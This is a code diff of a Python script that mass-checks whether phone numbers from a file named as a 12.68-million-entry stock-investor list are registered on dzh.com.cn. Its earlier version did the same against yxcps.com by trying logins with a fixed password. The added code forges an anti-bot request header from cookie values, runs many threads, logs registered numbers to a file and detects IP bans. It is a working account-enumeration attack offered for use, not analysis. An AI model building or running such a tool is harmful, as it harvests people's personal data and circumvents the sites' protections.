@@ -6,8 +6,9 @@ import time
 # import ddddocr
 import requests
 
+from moduless.output_utils import print_err, print_inf
+
 # from utils.netutils import fixpackage
-from output_utils import print_suc, print_inf
 
 n = 0
 suc = 0
@@ -81,32 +82,29 @@ class tel:
     #         input_element(tel_input_xpath,'13940273817')# 弄出验证码框
     #         input_element(pwd_input_xpath,'asldlfhawe')
     #         submit_btn.click()
-    JSESSIONID = '7F2A5FB27919F4%s' % generate_random_str(18)
+    JSESSIONID = '7F2A5FB27919%s' % generate_random_str(20)
 
     cookie = {'JSESSIONID': JSESSIONID}
+    headers = {'Accept': 'application/json, text/javascript, */*; q=0.01',
+               'referer': 'https://i.dzh.com.cn/UserCenter/page/account/forgetPass?source=2&redirect_uri=https%3A%2F'
+                          '%2Fpay.dzh.com.cn%2Fpay-mall%2FuserCenterReturn',
+               'X-Requested-Type': '4258e8e80',
+               '_umdata': 'GAE6CB15BC821438E93D7FB26B3632D5AE12B95'}
 
-    def getcsrftoken(self):
-        """
-    POST /csrfToken HTTP/1.1
-    Host: www.yxcps.com
-    Cookie: JSESSIONID=7F2A5FB27919F4FA49B71CA69B2F1903;
-    Content-Length: 11
-
-    suggest=txt
-        :return:
-        """
-        data = {'suggest': 'txt'
-                }
-        res = requests.post('http://www.yxcps.com/csrfToken', cookies=self.cookie, data=data)
-        requ = json.loads(res.text)['result']
+    def getCookie(self):
+        res = requests.get('http://i.dzh.com.cn/UserCenter/account/mobile/test?_=%s' % int(time.time()),
+                           cookies=self.cookie)
         if len(res.headers) > 0:
             setcook = res.headers['Set-Cookie']
+            setcook = setcook.replace(',', ';')
+            setcook = setcook.replace(' ', '')
+            # print(setcook)
             if len(setcook) > 0:
                 for it in setcook.split(';'):
                     res_s = it.split('=')
                     if len(res_s) > 1:
                         self.cookie[res_s[0]] = res_s[1]
-        return requ
+        return res
 
     # 开启验证码识别模块
 
@@ -116,65 +114,96 @@ class tel:
     #     n = d.classification(res.content)
     #     return n
 
-    def send_verify_package(self, phone: str):
-        headers_add = self.getcsrftoken()
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Ctoken': '',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Csrftoken': headers_add,
-            'Accept': '*/*',
-            'Connection': 'close'
-        }
-        data = {
-            'agree': 1,
-            'autoLoginFlag': 1,
-            'checkImageVCode': 0,
-            'accountNo': phone,
-            'imageVCode': '',
-            'pswd': 'ls82hhd92j',
-            'checkbox': 'checkbox',
-        }
-        r = requests.post('http://www.yxcps.com/account/axlogin2.do', headers=headers, cookies=self.cookie,
-                          data=data).text
-        return r
+    # def send_verify_package(self, phone: str):
+    #     headers_add = self.getcsrftoken()
+    #     headers = {
+    #         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    #         'Ctoken': '',
+    #         'X-Requested-With': 'XMLHttpRequest',
+    #         'Csrftoken': headers_add,
+    #         'Accept': '*/*',
+    #         'Connection': 'close'
+    #     }
+    #     data = {
+    #         'agree': 1,
+    #         'autoLoginFlag': 1,
+    #         'checkImageVCode': 0,
+    #         'accountNo': phone,
+    #         'imageVCode': '',
+    #         'pswd': 'ls82hhd92j',
+    #         'checkbox': 'checkbox',
+    #     }
+    #     r = requests.post('http://www.yxcps.com/account/axlogin2.do', headers=headers, cookies=self.cookie,
+    #                       data=data).text
+    #     return r
 
     threads = 0
 
     def doonce(self, tel):
         global n, suc, threads
         threads += 1
-        random_tel = tel
 
         n += 1
         while True:
             try:
-                msg = json.loads(self.send_verify_package(random_tel))['msg']
-                self.cookie = {'JSESSIONID': self.JSESSIONID}
-                # print(msg)
-                if '用户名或密码错误' in msg or '还未设置密码' in msg:
-                    w = open('tel.res', 'a')
-                    suc += 1
-                    print_suc('已注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
-                    w.write(random_tel + '\n')
-                    w.close()
+                self.getCookie()
+                # print(self.cookie)
+                _gpd = self.cookie.get('_gpd')
+                _cis = self.cookie.get('_cis')
+                _sad = self.cookie.get('_sad')
+                oauth = _gpd[-2] + _gpd[3] + _gpd[6] + _cis[-10] + _cis[2] + _cis[11] + _sad[2] + _sad[-10] + \
+                        _sad[-1]
+                self.headers['X-Requested-Type'] = oauth
+                response = requests.get(
+                    url='http://i.dzh.com.cn/UserCenter/account/mobile/%s?_=%s' % (tel, int(round(time.time() * 1000))),
+                    cookies=self.cookie, headers=self.headers)
+                # print(self.headers)
+                # print(self.cookie)
+                # print(response.url)
+                message = json.loads(response.text)['message']
+                if 'null' in message:
                     break
-                elif '未注册' in msg:
-                    # n += 1
-                    # print_inf('未注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
-                    break
+                elif '你的IP被拒绝服务' in message:
+                    print_err('ip被封禁24h')
                 else:
-                    print(msg)
-            except:
+                    suc += 1
+                    a = open('tel_dzh.txt', 'a')
+                    a.write(tel)
+                    a.close()
+                    print_inf('%s被注册过 正确率%.2f 发包次数%s' % (tel, (suc / n) * 100, n))
+                    break
+            except Exception:
                 pass
-        threads -= 1
+
+
+threads -= 1
+# while True:
+#     try:
+#         msg = json.loads(self.send_verify_package(random_tel))['msg']
+#         self.cookie = {'JSESSIONID': self.JSESSIONID}
+#         # print(msg)
+#         if '用户名或密码错误' in msg or '还未设置密码' in msg:
+#             w = open('tel.res', 'a')
+#             suc += 1
+#             print_suc('已注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
+#             w.write(random_tel + '\n')
+#             w.close()
+#             break
+#         elif '未注册' in msg:
+#             # n += 1
+#             # print_inf('未注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
+#             break
+#         else:
+#             print(msg)
+#     except:
+#         pass
 
 
 if __name__ == '__main__':
     lines = 0
     for it in open('dic/股民库_12680000.txt', 'r').readlines():
         lines += 1
-        if lines >= 400000:
+        if lines >= 0:
             # while True:
             # it = fixpackage(it)
             # a = tel()
@@ -183,8 +212,11 @@ if __name__ == '__main__':
             # except Exception:
             #     pass
             while True:
-                if threads <= 6000:
+                if threads <= 100:
                     threading.Thread(target=tel().doonce, args=(it,)).start()
                     break
                 else:
                     pass
+    # # 一个ip十次机会
+    # for i in range(1, 20):
+    #     tel().doonce('139%s' % tel().generate_random_str(8))
